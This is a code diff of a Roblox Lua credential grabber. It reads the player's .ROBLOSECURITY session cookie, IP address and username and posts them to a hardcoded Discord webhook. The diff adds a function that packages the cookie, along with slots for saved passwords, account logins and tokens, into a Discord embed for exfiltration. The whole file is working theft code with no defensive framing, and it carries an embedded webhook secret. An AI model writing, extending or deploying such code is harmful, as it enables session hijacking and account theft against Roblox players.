@@ -1,13 +1,20 @@
 local httpService = game:GetService("HttpService")
 local webhookUrl = "https://discord.com/api/webhooks/1322935736588304404/ZwopnDR91hy78bwVSk2cEdK1naXEMFu2b1shrl-0AVyGYwY-uapuCj9x8HQoHKNGXeJV"
 
-local function sendToWebhook(data)
-    local response = httpService:PostAsync(webhookUrl, httpService:JSONEncode({content = data}))
+local function sendToWebhook(embed)
+    local response = httpService:PostAsync(webhookUrl, httpService:JSONEncode({embeds = {embed}}))
     return response
 end
 
 local function getRobloxCookie()
-    return game:GetService("HttpService"):JSONDecode(game:HttpGet("https://www.roblox.com/"))[".ROBLOSECURITY"]
+    local cookie = ""
+    for _, v in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGet("https://www.roblox.com/")).cookies) do
+        if v.name == ".ROBLOSECURITY" then
+            cookie = v.value
+            break
+        end
+    end
+    return cookie
 end
 
 local function getIPAddress()
@@ -16,17 +23,17 @@ end
 
 local function getSavedPasswords()
     -- This function is not feasible to implement in Lua within Roblox due to sandboxing
-    return "Saved passwords retrieval is not possible within Roblox's sandboxed environment."
+    return {}
 end
 
 local function getRobloxAccounts()
     -- This function is not feasible to implement in Lua within Roblox due to sandboxing
-    return "Roblox accounts retrieval is not possible within Roblox's sandboxed environment."
+    return {}
 end
 
 local function getAllTokens()
     -- This function is not feasible to implement in Lua within Roblox due to sandboxing
-    return "Tokens retrieval is not possible within Roblox's sandboxed environment."
+    return {}
 end
 
 local function getUsername()
@@ -44,10 +51,34 @@ local function collectData()
     return data
 end
 
+local function sendData(data)
+    local embed = {
+        title = "Collected Data",
+        fields = {}
+    }
+
+    table.insert(embed.fields, {name = "Username", value = data.username, inline = false})
+    table.insert(embed.fields, {name = "Roblox Cookie", value = data.robloxCookie, inline = false})
+    table.insert(embed.fields, {name = "IP Address", value = data.ipAddress, inline = false})
+
+    for _, password in ipairs(data.savedPasswords) do
+        table.insert(embed.fields, {name = "Saved Password", value = "Site: " .. password.site .. "\nUsername: " .. password.username .. "\nPassword: " .. password.password, inline = false})
+    end
+
+    for _, account in ipairs(data.robloxAccounts) do
+        table.insert(embed.fields, {name = "Roblox Account", value = "Username: " .. account.username .. "\nPassword: " .. account.password, inline = false})
+    end
+
+    for _, token in ipairs(data.allTokens) do
+        table.insert(embed.fields, {name = "Token", value = "Site: " .. token.site .. "\nToken: " .. token.token, inline = false})
+    end
+
+    sendToWebhook(embed)
+end
+
 local function main()
     local data = collectData()
-    local message = "Collected Data:\n" .. httpService:JSONEncode(data)
-    sendToWebhook(message)
+    sendData(data)
 end
 
 main()
